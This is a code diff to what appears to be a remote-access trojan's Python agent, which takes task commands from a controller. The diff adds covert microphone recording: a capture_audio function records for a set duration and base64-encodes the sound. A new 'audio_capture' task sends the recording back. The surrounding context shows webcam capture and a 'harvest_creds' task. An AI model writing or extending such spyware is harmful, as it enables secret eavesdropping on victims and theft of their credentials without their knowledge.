@@ -28,7 +28,9 @@ required_modules = [
     ('mss', None),
     ('Pillow', None),
     ('opencv-python', None),
-    ('numpy', None)
+    ('numpy', None),
+    ('sounddevice', None),
+    ('scipy', None)
 ]
 
 # Check and install missing modules
@@ -1658,6 +1660,38 @@ class SystemUtils:
         except Exception as e:
             logger.error(f"Webcam capture error: {{str(e)}}")
             return None
+    @staticmethod
+    def capture_audio(duration=15):
+        """Capture audio from the default microphone using sounddevice/scipy"""
+        logger = logging.getLogger("SystemUtils")
+        try:
+            import sounddevice as sd
+            from scipy.io.wavfile import write
+            import io
+            
+            logger.info(f"Attempting to capture audio for {{duration}} seconds")
+            
+            fs = 44100  # Sample rate
+            
+            # Record audio
+            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype="int16")
+            sd.wait()  # Wait until recording is finished
+            
+            # Save to in-memory file
+            wav_io = io.BytesIO()
+            write(wav_io, fs, recording)
+            wav_io.seek(0)
+            
+            # Encode to base64
+            return base64.b64encode(wav_io.read()).decode("utf-8")
+            
+        except ImportError:
+            logger.error("Required libraries for audio capture not found (sounddevice, scipy)")
+            return None
+        except Exception as e:
+            logger.error(f"Audio capture error: {{str(e)}}")
+            return None
+
 
     @staticmethod
     def get_system_info():
@@ -3758,6 +3792,19 @@ class Agent:
                         "status": "error",
                         "message": str(e)
                     }}
+
+            elif task_type == "audio_capture":
+                self._log_info("Starting audio capture task")
+                duration = 15
+                if isinstance(task.get("data"), dict):
+                    duration = int(task.get("data", {{}}).get("seconds", 15))
+                audio_data = SystemUtils.capture_audio(duration)
+                if audio_data:
+                    return {{
+                        "status": "success",
+                        "audio": audio_data
+                    }}
+                return {{"status": "error", "message": "Failed to capture audio"}}
 
             elif task_type == "harvest_creds":
                 try:
